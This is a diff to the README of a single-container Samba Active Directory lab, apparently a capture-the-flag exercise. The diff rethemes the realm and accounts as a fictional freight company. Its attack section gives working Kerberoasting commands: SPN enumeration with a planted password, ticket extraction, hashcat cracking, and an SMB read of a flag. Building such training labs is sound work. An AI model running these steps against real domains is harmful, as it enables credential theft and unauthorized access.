@@ -2,9 +2,10 @@
 
 A single-container Active Directory lab built with [Isoloom](https://www.isoloom.com):
 [`isoloom.yml`](isoloom.yml) describes one Samba Domain Controller for the realm
-**NORTH.SEVENKINGDOMS.LOCAL** — no Windows VMs. It provisions a low-privilege foothold user
-(`hodor`), a kerberoastable service account (`svc_sql`, with an MSSQL SPN and a weak RC4 key),
-and a `vault` share only `svc_sql` may read.
+**MERIDIAN.LAB** (Meridian Freight, a logistics company) — no Windows VMs. It provisions a
+low-privilege foothold user (`t.okonkwo`, a dispatcher), a kerberoastable service account
+(`svc-mssql-tms`, the Transport Management System's database account, with an MSSQL SPN and a
+weak RC4 key), and a `manifests` share only `svc-mssql-tms` may read.
 
 | Machine | Service |
 | --- | --- |
@@ -12,14 +13,14 @@ and a `vault` share only `svc_sql` may read.
 
 ## The attack
 
-1. From `hodor` / `Hodor123!`, enumerate SPNs:
-   `GetUserSPNs.py -dc-ip <dc> NORTH.SEVENKINGDOMS.LOCAL/hodor:'Hodor123!'` → `svc_sql`,
-   SPN `MSSQLSvc/dc.north.sevenkingdoms.local:1433`.
+1. From `t.okonkwo` / `Dispatch!2024`, enumerate SPNs:
+   `GetUserSPNs.py -dc-ip <dc> MERIDIAN.LAB/t.okonkwo:'Dispatch!2024'` → `svc-mssql-tms`,
+   SPN `MSSQLSvc/dc.meridian.lab:1433`.
 2. Request and extract the service ticket (native MIT client against the Samba KDC):
-   `kinit hodor`, `kvno MSSQLSvc/dc.north.sevenkingdoms.local:1433`, then pull the
+   `kinit t.okonkwo`, `kvno MSSQLSvc/dc.meridian.lab:1433`, then pull the
    `$krb5tgs$23$...` hash from your credential cache.
 3. Crack it offline: `hashcat -m 13100 tgs.hash rockyou.txt`.
-4. Read the flag: `smbclient //dc/vault -U 'NORTH\svc_sql%<cracked>' -c 'get flag.txt'`.
+4. Read the flag: `smbclient //dc/manifests -U 'MERIDIAN\svc-mssql-tms%<cracked>' -c 'get flag.txt'`.
 
 ## Run it
 
